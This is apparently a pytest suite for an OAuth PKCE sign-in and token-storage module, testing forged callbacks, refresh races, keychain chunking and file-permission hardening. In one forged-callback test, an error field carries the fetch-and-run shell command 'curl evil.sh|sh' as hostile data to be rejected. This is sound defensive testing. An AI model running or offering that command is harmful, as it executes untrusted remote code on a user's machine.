import base64
import json
import os
import socket
import sys
import threading
import time
from urllib.parse import parse_qs, urlparse

import httpx
import pytest
from conftest import fresh_tokens, mock_client

from reinvent_planner import auth as auth_mod
from reinvent_planner.auth import (
    CLIENT_ID,
    Auth,
    AuthError,
    FileTokenStore,
    MemoryTokenStore,
    NotSignedInError,
    authorize_url,
    builder_id_logout_url,
    code_challenge,
    new_code_verifier,
)


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def fake_id_token(email: str) -> str:
    payload = base64.urlsafe_b64encode(json.dumps({"email": email}).encode()).rstrip(b"=").decode()
    return f"header.{payload}.signature"


# -- PKCE and URLs --------------------------------------------------------------


def test_code_challenge_matches_rfc7636_example():
    verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
    assert code_challenge(verifier) == "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"


def test_verifier_is_fresh_and_valid_length():
    a, b = new_code_verifier(), new_code_verifier()
    assert a != b
    assert 43 <= len(a) <= 128
    assert set(a) <= set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~")


def test_authorize_url_has_required_parameters():
    url = urlparse(authorize_url(8485, "state-123", "v" * 50))
    params = {k: v[0] for k, v in parse_qs(url.query).items()}
    assert url.netloc == "oauth.awsevents.com"
    assert params["client_id"] == CLIENT_ID
    assert params["redirect_uri"] == "http://127.0.0.1:8485/callback"
    assert params["scope"] == "openid email events/access"
    assert params["identity_provider"] == "AWSBuilderID"
    assert params["code_challenge_method"] == "S256"
    assert params["code_challenge"] == code_challenge("v" * 50)
    assert params["state"] == "state-123"


def test_builder_id_logout_url_nests_the_inner_logout():
    url = urlparse(builder_id_logout_url(8486))
    assert url.netloc == "idp.awsevents.com"
    inner = urlparse(parse_qs(url.query)["redirect_uri"][0])
    inner_params = {k: v[0] for k, v in parse_qs(inner.query).items()}
    assert inner.netloc == "oauth.awsevents.com" and inner.path == "/logout"
    assert inner_params["logout_uri"] == "http://127.0.0.1:8486/logout"


# -- sign-in flow ---------------------------------------------------------------


def _browser(params_for: callable, before=None, responses=None):
    """Simulate the browser: after the URL is announced, hit the local callback.

    `before(redirect, query)` runs first, to simulate an attacker or a stray connection.
    """

    def announce(url: str) -> None:
        query = {k: v[0] for k, v in parse_qs(urlparse(url).query).items()}
        redirect = query["redirect_uri"]

        def visit():
            time.sleep(0.1)
            if before:
                before(redirect, query)
            response = httpx.get(redirect, params=params_for(query), timeout=10)
            if responses is not None:
                responses.append(response.status_code)

        threading.Thread(target=visit, daemon=True).start()

    return announce


def ok_token_endpoint(request):
    return httpx.Response(200, json={"access_token": "a", "refresh_token": "r", "expires_in": 60})


def test_login_exchanges_code_with_matching_verifier():
    seen = {}

    def token_endpoint(request: httpx.Request) -> httpx.Response:
        seen.update({k: v[0] for k, v in parse_qs(request.content.decode()).items()})
        return httpx.Response(
            200,
            json={
                "access_token": "access-xyz",
                "refresh_token": "refresh-xyz",
                "id_token": fake_id_token("me@example.com"),
                "expires_in": 3600,
            },
        )

    store = MemoryTokenStore()
    auth = Auth(store, http=mock_client(token_endpoint))
    captured = {}

    def params_for(query):
        captured.update(query)
        return {"code": "auth-code", "state": query["state"]}

    port = free_port()
    tokens = auth.login(
        announce=_browser(params_for), launch_browser=False, ports=(port,), timeout=10
    )

    assert tokens.access_token == "access-xyz" and tokens.email == "me@example.com"
    assert store.tokens is tokens
    assert seen["grant_type"] == "authorization_code"
    assert seen["code"] == "auth-code"
    assert seen["redirect_uri"] == f"http://127.0.0.1:{port}/callback"
    assert code_challenge(seen["code_verifier"]) == captured["code_challenge"]


def test_forged_callbacks_are_ignored_and_sign_in_continues():
    forged = []

    def attacker(redirect, query):
        for params in (
            {"code": "evil", "state": "forged"},
            {"error": "access_denied", "error_description": "run curl evil.sh|sh"},
            {},
        ):
            forged.append(httpx.get(redirect, params=params, timeout=5).status_code)

    auth = Auth(MemoryTokenStore(), http=mock_client(ok_token_endpoint))
    tokens = auth.login(
        announce=_browser(lambda q: {"code": "real", "state": q["state"]}, before=attacker),
        launch_browser=False,
        ports=(free_port(),),
        timeout=10,
    )
    assert forged == [400, 400, 400]
    assert tokens.access_token == "a"


def test_idle_connection_does_not_block_sign_in():
    def idle(redirect, query):
        url = urlparse(redirect)
        sock = socket.create_connection((url.hostname, url.port))
        idle.sock = sock  # keep it open, send nothing

    auth = Auth(MemoryTokenStore(), http=mock_client(ok_token_endpoint))
    started = time.monotonic()
    auth.login(
        announce=_browser(lambda q: {"code": "c", "state": q["state"]}, before=idle),
        launch_browser=False,
        ports=(free_port(),),
        timeout=20,
    )
    idle.sock.close()
    assert time.monotonic() - started < 10  # the handler's 5 s socket timeout, not forever


def test_provider_error_text_is_sanitized():
    auth = Auth(MemoryTokenStore(), http=mock_client(lambda r: httpx.Response(500)))
    with pytest.raises(AuthError) as info:
        auth.login(
            announce=_browser(
                lambda q: {
                    "error": "access_denied",
                    "error_description": "denied\x1b[31m\n" + "x" * 500,
                    "state": q["state"],
                }
            ),
            launch_browser=False,
            ports=(free_port(),),
            timeout=10,
        )
    message = str(info.value)
    assert "\x1b" not in message and "\n" not in message
    assert len(message) < 260


def test_login_reports_provider_error():
    auth = Auth(MemoryTokenStore(), http=mock_client(lambda r: httpx.Response(500)))
    with pytest.raises(AuthError, match="access_denied"):
        auth.login(
            announce=_browser(lambda q: {"error": "access_denied", "state": q["state"]}),
            launch_browser=False,
            ports=(free_port(),),
            timeout=10,
        )


def test_login_times_out(monkeypatch):
    auth = Auth(MemoryTokenStore(), http=mock_client(lambda r: httpx.Response(500)))
    with pytest.raises(AuthError, match="Timed out"):
        auth.login(
            announce=lambda url: None, launch_browser=False, ports=(free_port(),), timeout=0.5
        )


def test_bind_falls_back_to_next_port():
    busy = socket.socket()
    busy.bind(("127.0.0.1", 0))
    busy.listen()
    try:
        taken, spare = busy.getsockname()[1], free_port()
        server, port = auth_mod._bind((taken, spare), lambda *a: None)
        server.server_close()
        assert port == spare
    finally:
        busy.close()


# -- refresh and sign-out -------------------------------------------------------


def test_access_token_refreshes_when_expiring_and_keeps_rotated_token():
    requests = []

    def token_endpoint(request):
        requests.append(parse_qs(request.content.decode()))
        return httpx.Response(
            200, json={"access_token": "new", "refresh_token": "rotated", "expires_in": 3600}
        )

    store = MemoryTokenStore(fresh_tokens(expires_at=time.time() + 10))
    auth = Auth(store, http=mock_client(token_endpoint))
    assert auth.access_token() == "new"
    assert requests[0]["grant_type"] == ["refresh_token"]
    assert requests[0]["refresh_token"] == ["refresh-1"]
    assert store.tokens.refresh_token == "rotated"
    assert store.tokens.email == "attendee@example.com"  # carried over


def test_refresh_without_new_refresh_token_keeps_the_old_one():
    store = MemoryTokenStore(fresh_tokens(expires_at=0))
    auth = Auth(
        store,
        http=mock_client(
            lambda r: httpx.Response(200, json={"access_token": "new", "expires_in": 60})
        ),
    )
    auth.access_token()
    assert store.tokens.refresh_token == "refresh-1"


def test_rejected_refresh_clears_tokens():
    store = MemoryTokenStore(fresh_tokens(expires_at=0))
    auth = Auth(
        store, http=mock_client(lambda r: httpx.Response(400, json={"error": "invalid_grant"}))
    )
    with pytest.raises(NotSignedInError):
        auth.access_token()
    assert store.tokens is None


def test_server_error_during_refresh_keeps_tokens():
    store = MemoryTokenStore(fresh_tokens(expires_at=0))
    auth = Auth(store, http=mock_client(lambda r: httpx.Response(503)))
    with pytest.raises(AuthError):
        auth.access_token()
    assert store.tokens is not None


def test_not_signed_in():
    with pytest.raises(NotSignedInError):
        Auth(MemoryTokenStore(), http=mock_client(lambda r: httpx.Response(500))).access_token()


def test_logout_revokes_refresh_token_and_clears_store():
    calls = []

    def endpoint(request):
        calls.append((request.url.path, parse_qs(request.content.decode())))
        return httpx.Response(200)

    store = MemoryTokenStore(fresh_tokens())
    assert Auth(store, http=mock_client(endpoint)).logout() is True
    assert calls == [("/oauth2/revoke", {"client_id": [CLIENT_ID], "token": ["refresh-1"]})]
    assert store.tokens is None


def test_logout_clears_store_even_if_revoke_fails():
    def endpoint(request):
        raise httpx.ConnectError("offline")

    store = MemoryTokenStore(fresh_tokens())
    assert Auth(store, http=mock_client(endpoint)).logout() is False
    assert store.tokens is None


# -- storage --------------------------------------------------------------------


def test_token_repr_hides_secrets():
    text = repr(fresh_tokens())
    assert "access-1" not in text and "refresh-1" not in text


def test_file_store_round_trip(tmp_path):
    store = FileTokenStore(tmp_path / "tokens.json")
    store.save(fresh_tokens())
    assert store.load().refresh_token == "refresh-1"
    store.clear()
    assert store.load() is None


@pytest.mark.skipif(os.name != "posix", reason="POSIX permissions")
def test_file_store_is_owner_only_and_refuses_loose_permissions(tmp_path):
    path = tmp_path / "tokens.json"
    store = FileTokenStore(path)
    store.save(fresh_tokens())
    assert (path.stat().st_mode & 0o777) == 0o600
    path.chmod(0o644)
    with pytest.raises(AuthError, match="readable by other users"):
        store.load()


def test_email_from_malformed_id_token_is_none():
    assert auth_mod._email_from_id_token("not-a-jwt") is None
    assert auth_mod._email_from_id_token(None) is None


def test_quick_relogin_can_reuse_the_same_port():
    port = free_port()
    for _ in range(2):
        auth = Auth(MemoryTokenStore(), http=mock_client(ok_token_endpoint))
        auth.login(
            announce=_browser(lambda q: {"code": "c", "state": q["state"]}),
            launch_browser=False,
            ports=(port,),
            timeout=10,
        )


# -- concurrent rip processes -----------------------------------------------------


class RotatingTokenServer:
    """Accepts only the newest refresh token and rotates it on every refresh."""

    def __init__(self):
        self.current = "refresh-1"
        self.count = 0

    def __call__(self, request):
        sent = parse_qs(request.content.decode())["refresh_token"][0]
        if sent != self.current:
            return httpx.Response(400, json={"error": "invalid_grant"})
        self.count += 1
        self.current = f"refresh-{self.count + 1}"
        return httpx.Response(
            200,
            json={
                "access_token": f"access-{self.count + 1}",
                "refresh_token": self.current,
                "expires_in": 3600,
            },
        )


def test_stale_process_adopts_rotated_tokens_instead_of_signing_everyone_out():
    server = RotatingTokenServer()
    store = MemoryTokenStore(fresh_tokens(expires_at=0))  # both processes share one store
    a = Auth(store, http=mock_client(server))
    b = Auth(store, http=mock_client(server))
    b.current()  # B caches refresh-1 before A rotates it
    assert a.access_token() == "access-2"
    assert b.access_token() == "access-2"  # adopted A's tokens without a network call
    assert server.count == 1 and store.tokens is not None


def test_stale_process_recovers_when_its_refresh_is_rejected_mid_race():
    server = RotatingTokenServer()
    store = MemoryTokenStore(fresh_tokens(expires_at=0))
    b = Auth(store, http=mock_client(server))
    b.current()
    # A rotates between B's pre-check and B's request: simulate by rotating on the server
    # and storing the new tokens right after B's pre-check load.
    original_load = store.load
    calls = {"n": 0}

    def load():
        calls["n"] += 1
        if calls["n"] == 2:  # B's pre-check inside _refresh
            tokens = original_load()
            Auth(store, http=mock_client(server)).force_refresh()
            return tokens
        return original_load()

    store.load = load
    assert b.force_refresh() == "access-2"
    assert store.tokens.refresh_token == "refresh-2"


def test_rejected_refresh_still_signs_out_when_nobody_has_newer_tokens():
    server = RotatingTokenServer()
    server.current = "something-else"
    store = MemoryTokenStore(fresh_tokens(expires_at=0))
    with pytest.raises(NotSignedInError):
        Auth(store, http=mock_client(server)).access_token()
    assert store.tokens is None


# -- keychain storage -------------------------------------------------------------


class SizeLimitedKeyring:
    """A fake keychain enforcing Windows' 1,280-character entry limit."""

    priority = 1

    def __init__(self, fail_after=None):
        self.data = {}
        self.sets = 0
        self.fail_after = fail_after

    def get_password(self, service, name):
        return self.data.get((service, name))

    def set_password(self, service, name, value):
        self.sets += 1
        if self.fail_after is not None and self.sets > self.fail_after:
            raise RuntimeError("keychain locked")
        if len(value) > 1280:
            raise RuntimeError("stub message: blob too big")
        self.data[(service, name)] = value

    def delete_password(self, service, name):
        import keyring.errors

        if (service, name) not in self.data:
            raise keyring.errors.PasswordDeleteError(name)
        del self.data[(service, name)]


@pytest.fixture
def fake_keyring(monkeypatch):
    import keyring

    backend = SizeLimitedKeyring()
    monkeypatch.setattr(keyring, "get_keyring", lambda: backend)
    for name in ("get_password", "set_password", "delete_password"):
        monkeypatch.setattr(keyring, name, getattr(backend, name))
    return backend


def test_keyring_store_chunks_long_tokens(fake_keyring):
    from reinvent_planner.auth import KeyringTokenStore

    store = KeyringTokenStore(service="rip-test")
    long_tokens = fresh_tokens(access_token="a" * 1500, refresh_token="r" * 2600)
    store.save(long_tokens)
    loaded = store.load()
    assert loaded.access_token == "a" * 1500 and loaded.refresh_token == "r" * 2600
    assert max(len(v) for v in fake_keyring.data.values()) <= 1000
    store.save(fresh_tokens())  # shorter tokens: stale chunks are removed
    assert store.load().refresh_token == "refresh-1"
    assert ("rip-test", "refresh_token.1") not in fake_keyring.data
    store.clear()
    assert fake_keyring.data == {}


def test_keyring_save_failure_rolls_back_and_explains(fake_keyring):
    from reinvent_planner.auth import KeyringTokenStore

    store = KeyringTokenStore(service="rip-test")
    fake_keyring.fail_after = 2
    with pytest.raises(AuthError, match="RIP_TOKEN_STORE=file"):
        store.save(fresh_tokens())
    assert fake_keyring.data == {}
    assert store.load() is None


def test_keyring_read_failure_is_an_auth_error(fake_keyring):
    from reinvent_planner.auth import KeyringTokenStore

    fake_keyring.data[("rip-test", "meta")] = "{not json"
    with pytest.raises(AuthError, match="rip logout"):
        KeyringTokenStore(service="rip-test").load()


@pytest.mark.skipif(sys.platform != "win32", reason="real Windows Credential Manager")
def test_windows_credential_manager_round_trip():
    import uuid

    from reinvent_planner.auth import KeyringTokenStore

    store = KeyringTokenStore(service=f"reinvent-planner-test-{uuid.uuid4().hex}")
    try:
        store.save(fresh_tokens(access_token="a" * 1500, refresh_token="r" * 2000))
        assert store.load().refresh_token == "r" * 2000
    finally:
        store.clear()


# -- file storage hardening ---------------------------------------------------------


def test_file_store_ignores_a_planted_temp_file(tmp_path):
    (tmp_path / "tokens.tmp").write_text("planted")
    if os.name == "posix":
        (tmp_path / "tokens.tmp").chmod(0o644)
    store = FileTokenStore(tmp_path / "tokens.json")
    store.save(fresh_tokens())
    assert store.load().refresh_token == "refresh-1"
    if os.name == "posix":
        assert ((tmp_path / "tokens.json").stat().st_mode & 0o777) == 0o600


@pytest.mark.skipif(os.name != "posix", reason="symlinks need privileges on Windows")
def test_file_store_refuses_symlinks(tmp_path):
    target = tmp_path / "elsewhere.json"
    FileTokenStore(target).save(fresh_tokens())
    (tmp_path / "tokens.json").symlink_to(target)
    with pytest.raises(AuthError, match="symbolic link"):
        FileTokenStore(tmp_path / "tokens.json").load()


def test_corrupt_token_file_is_an_auth_error(tmp_path):
    path = tmp_path / "tokens.json"
    FileTokenStore(path).save(fresh_tokens())
    path.write_text("{not json")
    if os.name == "posix":
        path.chmod(0o600)
    with pytest.raises(AuthError, match="corrupt"):
        FileTokenStore(path).load()


# -- regressions from the verification pass ------------------------------------------


def test_logout_clears_a_corrupt_token_file(tmp_path):
    path = tmp_path / "tokens.json"
    path.write_text("{not json")
    if os.name == "posix":
        path.chmod(0o600)
    auth = Auth(FileTokenStore(path), http=mock_client(lambda r: httpx.Response(200)))
    assert auth.logout() is False
    assert not path.exists()


@pytest.mark.skipif(os.name != "posix", reason="POSIX permissions")
def test_logout_clears_a_token_file_with_loose_permissions(tmp_path):
    path = tmp_path / "tokens.json"
    FileTokenStore(path).save(fresh_tokens())
    path.chmod(0o644)
    Auth(FileTokenStore(path), http=mock_client(lambda r: httpx.Response(200))).logout()
    assert not path.exists()


def test_empty_store_after_rejection_does_not_clear(monkeypatch):
    monkeypatch.setattr(time, "sleep", lambda s: None)
    store = MemoryTokenStore(fresh_tokens(expires_at=0))
    auth = Auth(store, http=mock_client(lambda r: httpx.Response(400)))
    auth.current()
    cleared = []
    store.clear = lambda: cleared.append(True)
    store.load = lambda: None  # another process is mid-save
    with pytest.raises(NotSignedInError):
        auth.force_refresh()
    assert cleared == []


def test_store_moving_on_twice_never_clears_the_newer_token():
    store = MemoryTokenStore(fresh_tokens(expires_at=0))
    versions = iter(
        [
            fresh_tokens(expires_at=0),  # pre-check: same as ours
            fresh_tokens(refresh_token="refresh-2", expires_at=0),  # after 1st rejection
            fresh_tokens(refresh_token="refresh-3", expires_at=0),  # after 2nd rejection
        ]
    )
    store.load = lambda: next(versions)
    cleared = []
    store.clear = lambda: cleared.append(True)
    auth = Auth(store, http=mock_client(lambda r: httpx.Response(400)))
    auth._tokens = fresh_tokens(expires_at=0)
    with pytest.raises(AuthError, match="kept changing"):
        auth.force_refresh()
    assert cleared == []


def test_keyring_clear_works_without_meta(fake_keyring):
    from reinvent_planner.auth import KeyringTokenStore

    store = KeyringTokenStore(service="rip-test")
    store.save(fresh_tokens(refresh_token="r" * 6000))  # 6 chunks
    fake_keyring.data[("rip-test", "meta")] = "{corrupt"
    fake_keyring.data[("rip-test", "refresh_token")] = "legacy"
    store.clear()
    assert fake_keyring.data == {}


def test_failed_save_keeps_the_previous_tokens(fake_keyring):
    from reinvent_planner.auth import KeyringTokenStore

    store = KeyringTokenStore(service="rip-test")
    store.save(fresh_tokens())
    fake_keyring.fail_after = fake_keyring.sets + 1  # the next save fails part-way
    with pytest.raises(AuthError):
        store.save(fresh_tokens(access_token="new", refresh_token="new-refresh"))
    assert store.load().refresh_token == "refresh-1"


def test_readers_never_see_a_missing_sign_in_during_a_save(fake_keyring):
    from reinvent_planner.auth import KeyringTokenStore

    store = KeyringTokenStore(service="rip-test")
    store.save(fresh_tokens())
    seen = []
    original_set = fake_keyring.set_password

    def spying_set(service, name, value):
        seen.append(store.load())  # what another process would read right now
        original_set(service, name, value)

    fake_keyring.set_password = spying_set
    import keyring

    keyring.set_password = spying_set
    store.save(fresh_tokens(refresh_token="refresh-2"))
    assert all(t is not None for t in seen)
    assert store.load().refresh_token == "refresh-2"


def test_interleaved_concurrent_saves_are_repaired(fake_keyring):
    """Two processes saving into the same slot at once can mix chunks; verify-and-retry fixes it."""
    from reinvent_planner.auth import KeyringTokenStore

    store = KeyringTokenStore(service="rip-test")
    store.save(fresh_tokens())
    other = fresh_tokens(access_token="B" * 1500, refresh_token="rB")
    mine = fresh_tokens(access_token="A" * 1500, refresh_token="rA")
    original_set = fake_keyring.set_password
    state = {"interleaved": False}

    def interleaving_set(service, name, value):
        original_set(service, name, value)
        if name.endswith(".0") and value.startswith("A") and not state["interleaved"]:
            state["interleaved"] = True
            KeyringTokenStore(service="rip-test").save(other)  # the other process, mid-save

    import keyring

    fake_keyring.set_password = interleaving_set
    keyring.set_password = interleaving_set
    store.save(mine)
    loaded = store.load()
    assert loaded in (mine, other)  # never a mix of the two


def test_chunk_deletion_survives_an_earlier_interrupted_delete(fake_keyring):
    from reinvent_planner.auth import KeyringTokenStore

    store = KeyringTokenStore(service="rip-test")
    store.save(fresh_tokens(refresh_token="r" * 3000))  # refresh_token.a.0-2
    del fake_keyring.data[("rip-test", "refresh_token.a.2")]  # top-down delete was interrupted
    store.clear()
    assert fake_keyring.data == {}


def test_a_failed_read_back_after_saving_never_loses_the_new_sign_in(fake_keyring, monkeypatch):
    """The review's M1: the save committed, then verifying it hit a keychain error."""
    from reinvent_planner.auth import KeyringTokenStore

    store = KeyringTokenStore(service="rip-test")
    store.save(fresh_tokens(access_token="old-access", refresh_token="old-refresh"))
    real_load = KeyringTokenStore.load
    calls = []

    def flaky_load(self):
        calls.append(1)
        if len(calls) == 1:
            raise AuthError("keychain busy")
        return real_load(self)

    monkeypatch.setattr(KeyringTokenStore, "load", flaky_load)
    store.save(fresh_tokens(access_token="new-access", refresh_token="new-refresh"))
    monkeypatch.setattr(KeyringTokenStore, "load", real_load)
    loaded = store.load()
    assert loaded is not None and loaded.refresh_token == "new-refresh"


# -- review fixes ----------------------------------------------------------------


def test_dead_token_is_not_cleared_if_another_process_saved_fresh_ones_meanwhile():
    store = MemoryTokenStore(fresh_tokens(expires_at=0))
    fresh = fresh_tokens(access_token="access-9", refresh_token="refresh-9")
    versions = iter(
        [
            fresh_tokens(expires_at=0),  # pre-check: same as ours
            fresh_tokens(expires_at=0),  # after the rejection: still the rejected token
            fresh,  # just before clearing: another process has saved new tokens
        ]
    )
    store.load = lambda: next(versions)
    cleared = []
    store.clear = lambda: cleared.append(True)
    auth = Auth(store, http=mock_client(lambda r: httpx.Response(400)))
    auth._tokens = fresh_tokens(expires_at=0)
    assert auth.force_refresh() == "access-9"
    assert cleared == []


@pytest.mark.parametrize(
    "body",
    [
        {"access_token": "", "refresh_token": "r"},
        {"access_token": 123, "refresh_token": "r"},
        {"access_token": ["a"], "refresh_token": "r"},
        {"refresh_token": "r"},
    ],
)
def test_token_response_needs_a_non_empty_string_access_token(body):
    with pytest.raises(AuthError, match="unexpected response"):
        auth_mod._tokens_from_response(body)


def test_token_response_refresh_token_must_be_a_non_empty_string():
    with pytest.raises(AuthError, match="refresh token"):
        auth_mod._tokens_from_response({"access_token": "a", "refresh_token": 42})
    kept = auth_mod._tokens_from_response(
        {"access_token": "a", "refresh_token": {"x": 1}}, previous=fresh_tokens()
    )
    assert kept.refresh_token == "refresh-1"


@pytest.mark.parametrize(
    ("expires_in", "expected"),
    [
        (None, 3600),
        ("soon", 3600),
        ("nan", 3600),
        ("inf", 3600),
        (1e999, 3600),
        ([1], 3600),
        (-5, 120),  # twice the refresh margin, so it isn't refreshed on every call
        (0, 120),
        (10**12, 86400),
        ("900", 900),
    ],
)
def test_token_lifetime_is_clamped(expires_in, expected):
    body = {"access_token": "a", "refresh_token": "r"}
    if expires_in is not None:
        body["expires_in"] = expires_in
    before = time.time()
    tokens = auth_mod._tokens_from_response(body)
    assert before + expected - 1 <= tokens.expires_at <= time.time() + expected + 1


@pytest.mark.parametrize(
    "payload", [["a", "list"], "a string", 42, None, {"email": 7}, {"email": ""}]
)
def test_id_token_payload_that_isnt_an_object_gives_no_email(payload):
    encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    assert auth_mod._email_from_id_token(f"h.{encoded}.s") is None
    tokens = auth_mod._tokens_from_response(
        {"access_token": "a", "refresh_token": "r", "id_token": f"h.{encoded}.s"}
    )
    assert tokens.email is None


def test_id_token_that_isnt_a_string_gives_no_email():
    assert auth_mod._email_from_id_token(12345) is None  # type: ignore[arg-type]


def test_email_from_id_token_loses_control_characters():
    assert auth_mod._email_from_id_token(fake_id_token("ada\x1b[2J@example.com")) == (
        "ada[2J@example.com"
    )


@pytest.mark.skipif(os.name != "posix", reason="POSIX ownership")
def test_file_store_refuses_a_file_owned_by_someone_else(tmp_path, monkeypatch):
    path = tmp_path / "tokens.json"
    FileTokenStore(path).save(fresh_tokens())
    monkeypatch.setattr(auth_mod.os, "getuid", lambda: path.stat().st_uid + 1)
    with pytest.raises(AuthError, match="belongs to another user"):
        FileTokenStore(path).load()


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="needs FIFOs")
def test_file_store_refuses_a_fifo_without_hanging(tmp_path):
    path = tmp_path / "tokens.json"
    os.mkfifo(path, 0o600)
    with pytest.raises(AuthError, match="unreadable or corrupt"):
        FileTokenStore(path).load()


def test_file_store_save_syncs_before_renaming(tmp_path, monkeypatch):
    order = []
    real_fsync, real_replace = os.fsync, os.replace
    monkeypatch.setattr(auth_mod.os, "fsync", lambda fd: (order.append("fsync"), real_fsync(fd)))
    monkeypatch.setattr(
        auth_mod.os, "replace", lambda a, b: (order.append("replace"), real_replace(a, b))
    )
    FileTokenStore(tmp_path / "tokens.json").save(fresh_tokens())
    assert order == ["fsync", "replace"]


def test_a_cancelled_builder_id_sign_out_says_sign_out():
    import threading

    stop = threading.Event()
    stop.set()
    with pytest.raises(AuthError, match="Builder ID sign-out cancelled"):
        auth_mod._wait_for_callback(
            "/logout",
            lambda port: f"http://127.0.0.1:{port}/logout",
            expected_state=None,
            ports=(0,),
            done_heading="x",
            done_body="y",
            announce=lambda url: None,
            launch_browser=False,
            timeout=5,
            cancel=stop,
            what="Builder ID sign-out",
        )
